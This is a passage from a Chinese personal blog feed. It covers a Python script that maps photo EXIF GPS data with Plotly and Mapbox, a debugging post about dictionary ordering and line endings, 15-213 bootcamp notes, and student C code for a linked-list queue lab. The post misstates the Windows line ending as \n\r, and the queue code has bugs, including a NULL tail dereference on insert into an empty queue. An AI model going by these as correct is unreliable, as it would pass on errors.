_convert_to_degress(gps_latitude)</span><br><span class="line">        <span class="keyword">if</span> gps_latitude_ref.values[<span class="number">0</span>] != <span class="string">'N'</span>:</span><br><span class="line">            lat = <span class="number">0</span> - lat</span><br><span class="line"></span><br><span class="line">        lon = _convert_to_degress(gps_longitude)</span><br><span class="line">        <span class="keyword">if</span> gps_longitude_ref.values[<span class="number">0</span>] != <span class="string">'E'</span>:</span><br><span class="line">            lon = <span class="number">0</span> - lon</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lat, lon</span><br></pre></td></tr></table></figure><p>最后代码</p><p>输入文件夹路径，数据可视化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> exifread</span><br><span class="line"><span class="keyword">import</span> plotly.plotly <span class="keyword">as</span> py </span><br><span class="line"><span class="keyword">from</span> plotly.graph_objs <span class="keyword">import</span> *</span><br><span class="line">mapbox_access_token = <span class="string">'####'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_if_exist</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> data[key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_convert_to_degress</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Helper function to convert the GPS coordinates stored in the EXIF to degress in float format</span></span><br><span class="line"><span class="string">    :param value:</span></span><br><span class="line"><span class="string">    :type value: exifread.utils.Ratio</span></span><br><span class="line"><span class="string">    :rtype: float</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    d = float(value.values[<span class="number">0</span>].num) / float(value.values[<span class="number">0</span>].den)</span><br><span class="line">    m = float(value.values[<span class="number">1</span>].num) / float(value.values[<span class="number">1</span>].den)</span><br><span class="line">    s = float(value.values[<span class="number">2</span>].num) / float(value.values[<span class="number">2</span>].den)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d + (m / <span class="number">60.0</span>) + (s / <span class="number">3600.0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_exif_location</span><span class="params">(exif_data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns the latitude and longitude, if available, from the provided exif_data (obtained through get_exif_data above)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    lat = <span class="keyword">None</span></span><br><span class="line">    lon = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    gps_latitude = _get_if_exist(exif_data, <span class="string">'GPS GPSLatitude'</span>)</span><br><span class="line">    gps_latitude_ref = _get_if_exist(exif_data, <span class="string">'GPS GPSLatitudeRef'</span>)</span><br><span class="line">    gps_longitude = _get_if_exist(exif_data, <span class="string">'GPS GPSLongitude'</span>)</span><br><span class="line">    gps_longitude_ref = _get_if_exist(exif_data, <span class="string">'GPS GPSLongitudeRef'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> gps_latitude <span class="keyword">and</span> gps_latitude_ref <span class="keyword">and</span> gps_longitude <span class="keyword">and</span> gps_longitude_ref:</span><br><span class="line">        lat = _convert_to_degress(gps_latitude)</span><br><span class="line">        <span class="keyword">if</span> gps_latitude_ref.values[<span class="number">0</span>] != <span class="string">'N'</span>:</span><br><span class="line">            lat = <span class="number">0</span> - lat</span><br><span class="line"></span><br><span class="line">        lon = _convert_to_degress(gps_longitude)</span><br><span class="line">        <span class="keyword">if</span> gps_longitude_ref.values[<span class="number">0</span>] != <span class="string">'E'</span>:</span><br><span class="line">            lon = <span class="number">0</span> - lon</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lat, lon</span><br><span class="line"></span><br><span class="line">dirname = input()</span><br><span class="line"></span><br><span class="line">lat1 = []</span><br><span class="line">lon1 = []</span><br><span class="line">text1 = []  </span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(dirname):</span><br><span class="line">path = dirname + filename</span><br><span class="line"><span class="comment">#if os.path.isdir(path):</span></span><br><span class="line"><span class="comment">#print(path)</span></span><br><span class="line"><span class="comment">#path += '/'</span></span><br><span class="line">f = open(path,<span class="string">'rb'</span>)</span><br><span class="line">tags = exifread.process_file(f)</span><br><span class="line">print(get_exif_location(tags))</span><br><span class="line">lat1.append(get_exif_location(tags)[<span class="number">0</span>])</span><br><span class="line">lon1.append(get_exif_location(tags)[<span class="number">1</span>])</span><br><span class="line">text1.append(filename)</span><br><span class="line">print(lat1)</span><br><span class="line">print(lon1)</span><br><span class="line">data = Data([</span><br><span class="line">    Scattermapbox(</span><br><span class="line">        lat = lat1,</span><br><span class="line">        lon = lon1,</span><br><span class="line">        mode=<span class="string">'markers'</span>,</span><br><span class="line">        marker=Marker(</span><br><span class="line">            size=<span class="number">9</span></span><br><span class="line">        ),</span><br><span class="line">        text = text1,</span><br><span class="line">    )</span><br><span class="line">])</span><br><span class="line">layout = Layout(</span><br><span class="line">    autosize=<span class="keyword">True</span>,</span><br><span class="line">    hovermode=<span class="string">'closest'</span>,</span><br><span class="line">    mapbox=dict(</span><br><span class="line">        accesstoken=mapbox_access_token,</span><br><span class="line">        bearing=<span class="number">0</span>,</span><br><span class="line">        center=dict(</span><br><span class="line">            lat=<span class="number">31.21</span>,</span><br><span class="line">            lon=<span class="number">121.46</span></span><br><span class="line">        ),</span><br><span class="line">        pitch=<span class="number">0</span>,</span><br><span class="line">        zoom=<span class="number">10</span></span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">fig = dict(data=data, layout=layout)</span><br><span class="line">py.plot(fig, filename=<span class="string">'Multiple Mapbox'</span>)</span><br></pre></td></tr></table></figure><p>主要是用了Plotly服务</p><p>还有需要在绘制地图之前在mapbox网站上获取一个Token</p><p>官方网址<code>https://plot.ly/python/scattermapbox/</code></p><p>一个小坑</p><p><code>https://stackoverflow.com/questions/34929778/keyerror-plotly-domain-when-using-plotly-to-do-scatter-plot-in-python</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use py.plot instead of py.iplot. Have a try.</span><br><span class="line">This works splendidly. iplot works with a Jupyter notebook (previously IPython notebook).</span><br></pre></td></tr></table></figure><p>感觉这个东西作为作业实在是太水了。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>一次python的神奇bug</title>
      <link href="/2017/12/01/%E4%B8%80%E6%AC%A1python%E7%9A%84%E7%A5%9E%E5%A5%87bug/"/>
      <url>/2017/12/01/%E4%B8%80%E6%AC%A1python%E7%9A%84%E7%A5%9E%E5%A5%87bug/</url>
      
        <content type="html"><![CDATA[<p>事情的缘由很简单，在做一道水题的时候卡题了。大半年前用C 写过的题，怎么用python就怎么也过不了了勒。<br>而且错误提示还是RUNTIME ERROR<br>在折腾的过程中发现了一些有趣的问题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">dict[chr(i)] = list1[j]</span><br><span class="line">dict[chr(i - <span class="number">32</span>)] = list1[i]</span><br><span class="line">j += <span class="number">1</span></span><br><span class="line">list2 = sorted(dict.items(), key = <span class="keyword">lambda</span> item: item[<span class="number">1</span>], reverse = <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p>我理所当然的以为创建字典的先后顺序会被保留下来，当然之前也知道字典是无序的，为啥当时就没当回事。这段代码在win下和linux下跑起来结果不一样，我还误以为是win和linux的系统差别，但其实是字典的无序性决定的。<br>那么字典为啥无序勒，就是取决于实现字典的数据结构，字典通过Hash Table来实现。那么具体实现方法在算法导论第十一章，今天晚上还没有仔细看。但是其中的内容肯定拿出来不止写一篇文章啦。</p><p>第二个问题就是导致RUNTIME ERROR的问题。<br>现在搞明白了我可以阐述一下问题产生的原因。<br>首先明白一件事情，不同操作系统表示换行符是不同的，可以通过Notepad++轻松看出来。<br>Win的换行符是<code>\n\r</code>  Linux的换行符是\n  Mac 的换行符是<code>\r</code></p><p>我是在win下先写的python文件，然后拖到了Linux的虚拟机里面。<br>如果从Linux的虚拟机里面复制东西，虚拟机会在末尾加上\r，以免出现错误。<br>但是我此时在Linux里的文件已经是\n\r了，这时复制出来就会每行末尾多出\r。导致每行末尾变成四不像。就无法在OJ上正常运行啦。</p><p>周三晚上碰到的问题今天就全部解决了。也是长了知识。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>15-213-Linux/Git-Bootcamp</title>
      <link href="/2017/11/29/15-213-Linux-Git-Bootcamp/"/>
      <url>/2017/11/29/15-213-Linux-Git-Bootcamp/</url>
      
        <content type="html"><![CDATA[<p>这个实验我觉得非常好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Outline</span><br><span class="line">1. Getting connected to the shark machines</span><br><span class="line">2. Transferring files between your computer and the shark machines</span><br><span class="line">3. Exploring and organizing your files on the shark machines</span><br><span class="line">4. Editing files and building code on the shark machines</span><br><span class="line">5. Using git to save your work history</span><br></pre></td></tr></table></figure></p><h2 id="Getting-Connected"><a href="#Getting-Connected" class="headerlink" title="Getting Connected"></a>Getting Connected</h2><p>是用KiTTY 用ssh连接 shark machines</p><h2 id="Transferring-Files"><a href="#Transferring-Files" class="headerlink" title="Transferring Files"></a>Transferring Files</h2><p>用FileZilla 通过ftp方式传输文件。</p><h2 id="Exploring-the-File-System"><a href="#Exploring-the-File-System" class="headerlink" title="Exploring the File System"></a>Exploring the File System</h2><p>一些简单的linux命令<img src="微信截图_20171129103657.png" alt="微信截图_20171129103657"></p><h2 id="Editing-Files-and-Building-Code"><a href="#Editing-Files-and-Building-Code" class="headerlink" title="Editing Files and Building Code"></a>Editing Files and Building Code</h2><p>用vim 编辑代码。还讲了编辑 vimrc文件。</p><h2 id="Introduction-to-Git"><a href="#Introduction-to-Git" class="headerlink" title="Introduction to Git"></a>Introduction to Git</h2><p>从零开始的入门介绍，包括key的配置，想想自己以前折腾的…唉</p><p><img src="微信截图_20171129104130.png" alt="微信截图_20171129104130"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>15-213-Lab0</title>
      <link href="/2017/11/29/15-213-Lab0/"/>
      <url>/2017/11/29/15-213-Lab0/</url>
      
        <content type="html"><![CDATA[<h1 id="15-213-Lab0"><a href="#15-213-Lab0" class="headerlink" title="15-213 Lab0"></a>15-213 Lab0</h1><p>这个实验是C语言编写链表，很久没用用过C语言，还是用了很长时间做完这个实验，期间还碰到了喜闻乐见segmentation fault，好像是因为打错某些东西发生的。最后一个问题链表反转是通过查资料搞定的，以前没见过，发现还是经典面试题之一。</p><p>放代码</p><p>queue.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Code for basic C skills diagnostic.</span></span><br><span class="line"><span class="comment"> * Developed for courses 15-213/18-213/15-513 by R. E. Bryant, 2017</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This program implements a queue supporting both FIFO and LIFO</span></span><br><span class="line"><span class="comment"> * operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It uses a singly-linked list to represent the set of queue elements</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"harness.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"queue.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Create empty queue.</span></span><br><span class="line"><span class="comment">  Return NULL if could not allocate space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">queue_t</span> *q_new()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">queue_t</span> *q =  <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">queue_t</span>));</span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">q-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* What if malloc returned NULL? */</span></span><br><span class="line">    q-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line">q-&gt;size=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free all storage used by queue */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_free</span><span class="params">(<span class="keyword">queue_t</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">    <span class="comment">/* How about freeing the list elements? */</span></span><br><span class="line">    <span class="comment">/* Free queue structure */</span></span><br><span class="line"><span class="keyword">list_ele_t</span> *P;</span><br><span class="line"><span class="keyword">list_ele_t</span> *Tmp;</span><br><span class="line"></span><br><span class="line">P = q-&gt;head;</span><br><span class="line">q-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span>(P != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Tmp = P-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(P);</span><br><span class="line">P = Tmp;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Attempt to insert element at head of queue.</span></span><br><span class="line"><span class="comment">  Return true if successful.</span></span><br><span class="line"><span class="comment">  Return false if q is NULL or could not allocate space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">q_insert_head</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list_ele_t</span> *newh;</span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/* What should you do if the q is NULL? */</span></span><br><span class="line">    newh = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">list_ele_t</span>));</span><br><span class="line">    <span class="comment">/* What if malloc returned NULL? */</span></span><br><span class="line"><span class="keyword">if</span>((newh == <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    newh-&gt;value = v;</span><br><span class="line">newh-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    newh-&gt;next = q-&gt;head;</span><br><span class="line"><span class="keyword">if</span>(q-&gt;size == <span class="number">0</span>)</span><br><span class="line">q-&gt;tail = newh;</span><br><span class="line">    q-&gt;head = newh;</span><br><span class="line">q-&gt;size += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Attempt to insert element at tail of queue.</span></span><br><span class="line"><span class="comment">  Return true if successful.</span></span><br><span class="line"><span class="comment">  Return false if q is NULL or could not allocate space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">q_insert_tail</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* You need to write the complete code for this function */</span></span><br><span class="line">    <span class="comment">/* Remember: It should operate in O(1) time */</span></span><br><span class="line"><span class="keyword">list_ele_t</span> *newh;</span><br><span class="line">newh = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">list_ele_t</span>));</span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span> || newh == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">newh-&gt;value = v;</span><br><span class="line">newh-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">q-&gt;tail-&gt;next = newh;</span><br><span class="line">q-&gt;tail = newh;</span><br><span class="line">q-&gt;size += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Attempt to remove element from head of queue.</span></span><br><span class="line"><span class="comment">  Return true if successful.</span></span><br><span class="line"><span class="comment">  Return false if queue is NULL or empty.</span></span><br><span class="line"><span class="comment">  If vp non-NULL and element removed, store removed value at *vp.</span></span><br><span class="line"><span class="comment">  Any unused storage should be freed</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">q_remove_head</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> *vp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* You need to fix up this code. */</span></span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span> || q-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">list_ele_t</span> *tmp;</span><br><span class="line">tmp = q-&gt;head;</span><br><span class="line"><span class="keyword">if</span>(vp != <span class="literal">NULL</span>)</span><br><span class="line">*vp = tmp-&gt;value;</span><br><span class="line">q-&gt;head = tmp-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(tmp);</span><br><span class="line">q-&gt;size -= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Return number of elements in queue.</span></span><br><span class="line"><span class="comment">  Return 0 if q is NULL or empty</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">q_size</span><span class="params">(<span class="keyword">queue_t</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* You need to write the code for this function */</span></span><br><span class="line">    <span class="comment">/* Remember: It should operate in O(1) time */</span></span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span> || q-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> q-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Reverse elements in queue.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Your implementation must not allocate or free any elements (e.g., by</span></span><br><span class="line"><span class="comment">  calling q_insert_head or q_remove_head).  Instead, it should modify</span></span><br><span class="line"><span class="comment">  the pointers in the existing data structure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_reverse</span><span class="params">(<span class="keyword">queue_t</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (q == <span class="literal">NULL</span> || q-&gt;size ==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">list_ele_t</span> *end = q-&gt;tail;</span><br><span class="line"><span class="keyword">list_ele_t</span> *p = q-&gt;head;</span><br><span class="line"><span class="keyword">bool</span> tag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span>(q-&gt;head != end)&#123;</span><br><span class="line">q-&gt;head = q-&gt;head-&gt;next;</span><br><span class="line">p-&gt;next = end-&gt;next;</span><br><span class="line">end-&gt;next = p;</span><br><span class="line"><span class="keyword">if</span>(!tag)&#123;</span><br><span class="line">q-&gt;tail = p;</span><br><span class="line">tag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">p = q-&gt;head;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* You need to write the code for this function */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>queue.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Code for basic C skills diagnostic.</span></span><br><span class="line"><span class="comment"> * Developed for courses 15-213/18-213/15-513 by R. E. Bryant, 2017</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This program implements a queue supporting both FIFO and LIFO</span></span><br><span class="line"><span class="comment"> * operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It uses a singly-linked list to represent the set of queue elements</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span 